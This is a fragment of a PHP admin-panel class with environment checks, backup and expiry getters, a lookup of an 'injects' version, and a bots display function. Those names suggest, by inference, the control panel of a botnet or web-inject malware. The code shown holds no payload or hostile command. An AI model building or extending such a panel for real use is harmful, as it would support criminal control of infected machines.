
		$data_dir = "OK";
		if(!is_writable("../data/"))
		{
			@chmod("../data/", 0755);
			if(!is_writable("../data/"))
			{
				$errors .= "ERROR: data is not writable<br />";
			}
		}

		$time = date('G:i:s', time()) . " " . ini_get("date.timezone");
		$php = phpversion();
		
		if(((int)ini_get('upload_max_filesize')) < 100) $errors .= "ERROR: upload_max_filesize < 100mb<br />";

		if(((int)ini_get('post_max_size')) < 100) $errors .= "ERROR: post_max_size < 100mb<br />";

		if(((int)ini_get('memory_limit')) < 1024 && ((int)ini_get('memory_limit')) != -1) $errors .= "ERROR: memory_limit < 1024mb<br />";

		if($errors != "") $errors = "<p style='color: red'>{$errors}</p>";
		
		return $errors;
	}
	
	function getLastBackupAt()
	{
		if(!file_exists($this->LAST_BACKUP_TS)) return "Not configured";
		
		$ts = (int)file_get_contents($this->LAST_BACKUP_TS);
		return date("M d H:i", $ts);
	}
	
	function getInjectsVersion()
	{
		$sql = "select value from config where name='smarts_ver'";
		return $this->db->fetch($sql, true)[0]['value'];
	}
	
	function getExpireDate()
	{
		if(!file_exists($this->EXPIRE_FILE)) return "Not set";
		
		$ts = (int)file_get_contents($this->EXPIRE_FILE);
		
		$diff = $ts - time();
		$days = round($diff/60/60/24);
		
		$word = "day";
		if($days > 1)
			$word .= "s";
		
		$dt = date("M d H:i", $ts);
		return $dt;
	}
	
	function process_bots($page)
	{
		$bots = new Bots($this->db);
		return $bots->draw($_REQUEST);
	}
}




























